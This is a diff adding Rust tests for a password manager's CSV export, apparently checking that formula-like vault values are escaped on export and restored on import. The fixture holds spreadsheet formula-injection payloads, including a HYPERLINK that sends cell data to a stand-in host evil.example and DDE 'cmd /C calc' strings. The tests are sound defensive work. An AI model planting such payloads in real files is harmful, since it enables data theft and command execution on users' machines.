@@ -704,6 +704,161 @@ fn csv_round_trip() {
     assert_eq!(items[1].notes, data.items[1].notes);
 }
 
+/// Data rows of a CSV text, by column name.
+fn csv_rows(text: &str) -> Vec<std::collections::HashMap<String, String>> {
+    let mut reader = csv::Reader::from_reader(text.as_bytes());
+    let headers: Vec<String> = reader
+        .headers()
+        .unwrap()
+        .iter()
+        .map(str::to_owned)
+        .collect();
+    reader
+        .records()
+        .map(|r| {
+            headers
+                .iter()
+                .cloned()
+                .zip(r.unwrap().iter().map(str::to_owned))
+                .collect()
+        })
+        .collect()
+}
+
+fn formula_login(name: &str, username: &str, password: &str) -> VaultItem {
+    VaultItem {
+        id: format!("id-{name}"),
+        item_type: ItemType::Login,
+        name: name.into(),
+        login: Some(LoginData {
+            username: username.into(),
+            password: password.into(),
+            ..Default::default()
+        }),
+        ..Default::default()
+    }
+}
+
+/// Values a malicious website (save-login prompt) or an imported file put
+/// into the vault must not become spreadsheet formulas in a CSV export.
+fn formula_data() -> VaultData {
+    let mut evil = formula_login(
+        "=HYPERLINK(\"https://evil.example/?p=\"&J3,\"Open\")",
+        "=HYPERLINK(\"x\")",
+        "=pw",
+    );
+    evil.folder_id = Some("f1".into());
+    evil.notes = "-1+1".into();
+    evil.fields = vec![
+        CustomField {
+            name: "=f".into(),
+            value: "=v".into(),
+            kind: FieldKind::Text,
+        },
+        CustomField {
+            name: "ok".into(),
+            value: "@x".into(),
+            kind: FieldKind::Text,
+        },
+    ];
+    if let Some(l) = evil.login.as_mut() {
+        l.uris = vec![LoginUri {
+            uri: "=cmd|' /C calc'!A0".into(),
+            match_type: UriMatch::Domain,
+        }];
+        l.totp = "=t".into();
+    }
+    let mut phone = formula_login("Phone", "+4912345", "-pw");
+    phone.notes = "\t=x".into();
+    let mut quoted = formula_login("'=already", "@handle", "@SUM(1+1)*cmd|' /C calc'!A0");
+    quoted.notes = "'plain".into();
+    let dash = formula_login("Dash", "-user", " =spaced");
+    VaultData {
+        items: vec![evil, phone, quoted, dash],
+        folders: vec![Folder {
+            id: "f1".into(),
+            name: "@team".into(),
+        }],
+        generator_history: vec![],
+    }
+}
+
+#[test]
+fn csv_export_neutralises_formulas() {
+    let text = export_csv(&formula_data());
+    assert!(text.contains("\"'=HYPERLINK(\"\"https://evil.example/"));
+    let rows = csv_rows(&text);
+    assert_eq!(rows.len(), 4);
+    let r = &rows[0];
+    assert_eq!(r["folder"], "'@team");
+    assert_eq!(
+        r["name"],
+        "'=HYPERLINK(\"https://evil.example/?p=\"&J3,\"Open\")"
+    );
+    assert_eq!(r["notes"], "'-1+1");
+    assert_eq!(r["fields"], "'=f: =v\nok: @x");
+    assert_eq!(r["login_uri"], "'=cmd|' /C calc'!A0");
+    assert_eq!(r["login_username"], "'=HYPERLINK(\"x\")");
+    // Secrets are exported unchanged (other managers must import them).
+    assert_eq!(r["login_password"], "=pw");
+    assert_eq!(r["login_totp"], "=t");
+    let r = &rows[1];
+    assert_eq!(r["login_username"], "+4912345", "phone numbers stay");
+    assert_eq!(r["login_password"], "-pw");
+    assert_eq!(r["notes"], "'\t=x");
+    let r = &rows[2];
+    assert_eq!(r["name"], "''=already");
+    assert_eq!(r["login_username"], "'@handle");
+    assert_eq!(r["login_password"], "@SUM(1+1)*cmd|' /C calc'!A0");
+    assert_eq!(r["notes"], "'plain");
+    let r = &rows[3];
+    assert_eq!(r["login_username"], "-user");
+    assert_eq!(r["login_password"], " =spaced");
+    for r in &rows {
+        for column in ["folder", "name", "notes", "fields", "login_uri"] {
+            let v = r[column].trim_start();
+            assert!(
+                !v.starts_with(['=', '+', '-', '@']) && !r[column].starts_with(['\t', '\r']),
+                "{column}: {v:?}"
+            );
+        }
+        assert!(!r["login_username"].trim_start().starts_with(['=', '@']));
+    }
+}
+
+#[test]
+fn csv_formula_escaping_round_trips() {
+    let data = formula_data();
+    let (items, folders, warnings) = import_csv(&export_csv(&data)).unwrap();
+    assert!(warnings.is_empty(), "{warnings:?}");
+    assert_eq!(folders.len(), 1);
+    assert_eq!(folders[0].name, "@team");
+    assert_eq!(items.len(), data.items.len());
+    for (back, orig) in items.iter().zip(&data.items) {
+        assert_eq!(back.name, orig.name);
+        assert_eq!(back.notes, orig.notes);
+        let (bl, ol) = (login_of(back), login_of(orig));
+        assert_eq!(bl.username, ol.username);
+        assert_eq!(bl.password, ol.password);
+        assert_eq!(bl.totp, ol.totp);
+        let uris: Vec<_> = bl.uris.iter().map(|u| u.uri.as_str()).collect();
+        let orig_uris: Vec<_> = ol.uris.iter().map(|u| u.uri.as_str()).collect();
+        assert_eq!(uris, orig_uris);
+        let fields: Vec<_> = back
+            .fields
+            .iter()
+            .map(|f| (f.name.as_str(), f.value.as_str()))
+            .collect();
+        let orig_fields: Vec<_> = orig
+            .fields
+            .iter()
+            .map(|f| (f.name.as_str(), f.value.as_str()))
+            .collect();
+        assert_eq!(fields, orig_fields);
+    }
+    assert_eq!(items[0].folder_id.as_deref(), Some(folders[0].id.as_str()));
+}
+
 #[test]
 fn encrypted_export_round_trip() {
     let dir = tempfile::tempdir().unwrap();
